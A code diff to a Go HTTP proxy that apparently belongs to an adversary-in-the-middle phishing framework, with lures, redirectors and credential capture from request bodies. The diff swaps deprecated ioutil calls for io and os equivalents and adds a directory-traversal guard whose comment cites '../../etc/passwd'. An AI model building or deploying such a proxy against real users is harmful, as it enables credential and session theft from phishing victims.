@@ -18,7 +18,6 @@ import (
 	"fmt"
 	"html"
 	"io"
-	"io/ioutil"
 	"math/rand"
 	"net"
 	"net/http"
@@ -221,7 +220,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	}
 
 	// Load custom error page
-	if epData, err := ioutil.ReadFile("web/error.html"); err == nil {
+	if epData, err := os.ReadFile("web/error.html"); err == nil {
 		p.errorPageHtml = string(epData)
 		log.Info("Loaded custom error page from web/error.html")
 	} else {
@@ -775,7 +774,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
-										html, err := ioutil.ReadFile(index_found)
+										html, err := os.ReadFile(index_found)
 										if err == nil {
 
 											html = p.injectOgHeaders(l, html)
@@ -842,24 +841,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 							path := filepath.Join(t_dir, rel_path)
-							if info, err := os.Stat(path); !os.IsNotExist(err) && !info.IsDir() {
-								fdata, err := ioutil.ReadFile(path)
-								if err == nil {
-									//log.Debug("ext: %s", filepath.Ext(req_path))
-									mime_type := getContentType(req_path, fdata)
-									//log.Debug("mime_type: %s", mime_type)
-									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
-									if resp != nil {
-										resp.Body = io.NopCloser(bytes.NewReader(fdata))
-										return req, resp
+							if withinDir(t_dir, path) {
+								if info, err := os.Stat(path); !os.IsNotExist(err) && !info.IsDir() {
+									fdata, err := os.ReadFile(path)
+									if err == nil {
+										//log.Debug("ext: %s", filepath.Ext(req_path))
+										mime_type := getContentType(req_path, fdata)
+										//log.Debug("mime_type: %s", mime_type)
+										resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
+										if resp != nil {
+											resp.Body = io.NopCloser(bytes.NewReader(fdata))
+											return req, resp
+										} else {
+											log.Error("lure: failed to create redirector data file response")
+										}
 									} else {
-										log.Error("lure: failed to create redirector data file response")
+										log.Error("lure: failed to read redirector data file: %s", err)
 									}
-								} else {
-									log.Error("lure: failed to read redirector data file: %s", err)
 								}
-							} else {
-								//log.Warning("lure: template file does not exist: %s", path)
 							}
 						} else if s.PostRedirectorName != "" {
 							// session has a post-redirector active - serve its static assets
@@ -889,22 +888,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 							post_path := filepath.Join(post_t_dir, post_rel_path)
-							if info, err := os.Stat(post_path); !os.IsNotExist(err) && !info.IsDir() {
-								fdata, err := ioutil.ReadFile(post_path)
-								if err == nil {
-									mime_type := getContentType(req_path, fdata)
-									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
-									if resp != nil {
-										resp.Body = io.NopCloser(bytes.NewReader(fdata))
-										return req, resp
+							if withinDir(post_t_dir, post_path) {
+								if info, err := os.Stat(post_path); !os.IsNotExist(err) && !info.IsDir() {
+									fdata, err := os.ReadFile(post_path)
+									if err == nil {
+										mime_type := getContentType(req_path, fdata)
+										resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
+										if resp != nil {
+											resp.Body = io.NopCloser(bytes.NewReader(fdata))
+											return req, resp
+										} else {
+											log.Error("post-redirector: failed to create asset response")
+										}
 									} else {
-										log.Error("post-redirector: failed to create asset response")
+										log.Error("post-redirector: failed to read asset file: %s", err)
 									}
-								} else {
-									log.Error("post-redirector: failed to read asset file: %s", err)
+								} else if s.RedirectURL != "" {
+									// any navigation request that isn't a post-redirector static asset → redirect to final URL
+									resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+									if resp != nil {
+										resp.Header.Set("Location", s.RedirectURL)
+										return req, resp
+									}
 								}
 							} else if s.RedirectURL != "" {
-								// any navigation request that isn't a post-redirector static asset → redirect to final URL
 								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 								if resp != nil {
 									resp.Header.Set("Location", s.RedirectURL)
@@ -1038,9 +1045,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					body, err := ioutil.ReadAll(req.Body)
+					body, err := io.ReadAll(req.Body)
 					if err == nil {
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
@@ -1242,7 +1249,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 						}
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
 
@@ -1412,7 +1419,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// modify received body
-			body, err := ioutil.ReadAll(resp.Body)
+			body, err := io.ReadAll(resp.Body)
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1787,7 +1794,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+				resp.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 				resp.ContentLength = int64(len(body))
 				resp.Header.Del("Content-Length")
 
@@ -1876,7 +1883,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 
 								if index_found != "" {
-									if html, err := ioutil.ReadFile(index_found); err == nil {
+									if html, err := os.ReadFile(index_found); err == nil {
 										post_body := string(html)
 										// replace {lure_url_html} and {redirect_url} with the final redirect URL
 										post_body = strings.ReplaceAll(post_body, "{lure_url_html}", s.RedirectURL)
@@ -2825,6 +2832,13 @@ func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
 	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
 }
 
+// withinDir reports whether path is contained within root, preventing directory
+// traversal (e.g. ../../etc/passwd) when serving redirector assets.
+func withinDir(root, path string) bool {
+	cleanRoot := filepath.Clean(root) + string(filepath.Separator)
+	return strings.HasPrefix(filepath.Clean(path)+string(filepath.Separator), cleanRoot)
+}
+
 func isStaticPath(path string) bool {
 	switch strings.ToLower(filepath.Ext(path)) {
 	case ".css", ".js", ".map", ".svg", ".png", ".jpg", ".jpeg",
@@ -2944,7 +2958,7 @@ func (p *HttpProxy) handleTelemetryData(req *http.Request, from_ip string) (*htt
 	}
 
 	// Read request body
-	body, err := ioutil.ReadAll(req.Body)
+	body, err := io.ReadAll(req.Body)
 	if err != nil {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Failed to read request body"}`)
 	}
@@ -2975,7 +2989,7 @@ func (p *HttpProxy) handleCaptchaVerification(req *http.Request, from_ip string)
 	}
 
 	// Read request body
-	body, err := ioutil.ReadAll(req.Body)
+	body, err := io.ReadAll(req.Body)
 	if err != nil {
 		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Failed to read request body"}`)
 	}
